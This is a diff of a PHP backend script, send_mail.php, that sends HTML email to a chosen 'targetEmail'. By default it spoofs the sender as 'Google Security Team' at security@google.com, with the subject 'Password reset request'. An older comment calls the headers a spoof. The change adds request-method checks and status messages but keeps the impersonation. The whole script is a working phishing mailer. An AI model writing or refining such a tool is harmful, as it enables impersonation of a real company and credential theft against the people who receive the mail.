@@ -1,33 +1,34 @@
 <?php
-// send_mail.php – backend email sender (PHP)
-// Place this in the same directory as index.html on a PHP-enabled server.
+// send_mail.php – with error logging and response
+if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
+    http_response_code(405);
+    die('405 Method Not Allowed – only POST accepted.');
+}
 
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $targetEmail = trim($_POST['targetEmail'] ?? '');
-    $senderName = trim($_POST['senderName'] ?? 'Google Security Team');
-    $senderEmail = trim($_POST['senderEmail'] ?? 'security@google.com');
-    $subject = trim($_POST['subject'] ?? 'Password reset request');
-    $message = trim($_POST['message'] ?? '');
+$targetEmail = trim($_POST['targetEmail'] ?? '');
+if (!$targetEmail) {
+    die('Error: targetEmail is required.');
+}
 
-    // Replace {{email}} placeholder with actual target email in message body
-    $message = str_replace('{{email}}', htmlspecialchars($targetEmail), $message);
+// Build message
+$subject = trim($_POST['subject'] ?? 'Password reset request');
+$message = trim($_POST['message'] ?? '');
+$message = str_replace('{{email}}', htmlspecialchars($targetEmail), $message);
+$senderName = trim($_POST['senderName'] ?? 'Google Security Team');
+$senderEmail = trim($_POST['senderEmail'] ?? 'security@google.com');
 
-    // Headers – spoof from, reply-to, and HTML content
-    $headers = "MIME-Version: 1.0\r\n";
-    $headers .= "Content-type: text/html; charset=UTF-8\r\n";
-    $headers .= "From: $senderName <$senderEmail>\r\n";
-    $headers .= "Reply-To: $senderEmail\r\n";
-    $headers .= "X-Mailer: PHP/" . phpversion();
+$headers = "MIME-Version: 1.0\r\n";
+$headers .= "Content-type: text/html; charset=UTF-8\r\n";
+$headers .= "From: $senderName <$senderEmail>\r\n";
+$headers .= "Reply-To: $senderEmail\r\n";
 
-    // Send mail
-    $success = mail($targetEmail, $subject, $message, $headers);
+// Attempt to send
+$success = mail($targetEmail, $subject, $message, $headers);
 
-    // Return JSON response for AJAX (but we use form POST, so redirect back with status)
-    if ($success) {
-        header('Location: index.html?status=success');
-    } else {
-        header('Location: index.html?status=error');
-    }
-    exit;
+// Return JSON for fetch or simple redirect
+if ($success) {
+    echo "OK – email sent to $targetEmail";
+} else {
+    echo "ERROR – mail() failed. Check server mail logs.";
 }
 ?>
